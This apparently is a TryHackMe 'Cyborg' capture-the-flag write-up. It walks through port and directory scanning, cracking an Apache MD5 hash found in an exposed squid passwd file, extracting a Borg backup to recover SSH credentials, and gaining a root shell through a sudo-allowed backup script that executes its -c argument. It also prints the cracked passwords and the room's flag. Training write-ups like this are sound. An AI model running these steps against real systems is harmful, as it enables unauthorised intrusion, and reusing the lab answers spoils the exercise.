# TryHackMe — Cyborg Walkthrough (Write-Up)

## Overview

This report documents the full exploitation process of the **Cyborg** machine.
The objective was to enumerate exposed services, obtain initial credentials, gain user access, and finally escalate privileges to root.

---

# 1. Enumeration

Initial reconnaissance was performed using **Nmap**.

```bash
nmap -sC -sV <TARGET_IP>
```

### Result

The scan revealed two open ports:

* **22 — SSH**
* **80 — HTTP**

The presence of a web server suggested a potential entry point.

---

# 2. Web Enumeration

Directory brute forcing was performed using:

```bash
dirsearch -u http://<TARGET_IP>
```

### Discovered Directories

```
/admin
/admin/index.html
/admin/admin.html
/etc
```

The `/etc` directory contained sensitive files exposed via HTTP.

---

# 3. Credential Discovery

Inside:

```
/etc/squid/passwd
```

the following credential entry was discovered:

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn
```

The password was stored as an **Apache MD5 (APR1) hash**.

---

# 4. Password Cracking

The hash was saved locally:

```bash
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn' > cyborg_hash.txt
```

Hash cracking was performed using John the Ripper:

```bash
john cyborg_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Result

Password recovered:

```
squidward
```

---

# 5. Borg Backup Discovery

After further exploration, a backup repository was identified:

```
home/field/dev/final_archive
```

The README file indicated that it was a **Borg Backup repository**.

Borg is a Linux backup system commonly used to archive entire home directories.

The repository contained the archive:

```
music_archive
```

---

# 6. Extracting Backup Files

After installing Borg locally, the archive was extracted:

```bash
borg extract final_archive::music_archive
```

This restored the backed-up file structure locally.

Inside the extracted files:

```
home/alex/Documents/note.txt
```

a credential was discovered.

---

# 7. SSH Access

The file contained:

```
alex:S3cretP@s3
```

SSH login was successful:

```bash
ssh alex@<TARGET_IP>
```

---

# 8. User Flag

After login:

```bash
ls -la
```

The user flag was located and read:

```bash
cat user.txt
```

---

# 9. Privilege Escalation Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Result:

```
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

This means user **alex** could execute the script as root without a password.

---

# 10. Backup Script Analysis

The script contained the following logic:

```bash
while getopts c: flag
do
   case "${flag}" in
      c) command=${OPTARG};;
   esac
done
```

This allows the user to pass an argument using:

```
-c <command>
```

At the end of the script:

```bash
cmd=$($command)
```

The provided command is executed directly.

---

## Vulnerability

Because the script runs via sudo as root, this results in:

**Command Injection with Root Privileges.**

The developer failed to validate user input.

---

# 11. Root Access

A root shell was obtained using:

```bash
sudo /etc/mp3backups/backup.sh -c "/bin/bash"
```

Verification:

```bash
whoami
```

Output:

```
root
```

---

# 12. Root Flag

Finally:

```bash
cat /root/root.txt
```

Flag obtained:

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

---

# Lessons Learned

* Backup repositories often contain sensitive information.
* Bash history and notes frequently expose credentials.
* Misconfigured sudo scripts can lead directly to privilege escalation.
* Unsanitised command execution is a critical vulnerability.

---

## Tools Used

* Nmap
* Dirsearch
* John the Ripper
* Borg Backup
* SSH

---

## Author

Walkthrough prepared as part of cybersecurity training and penetration testing practice.
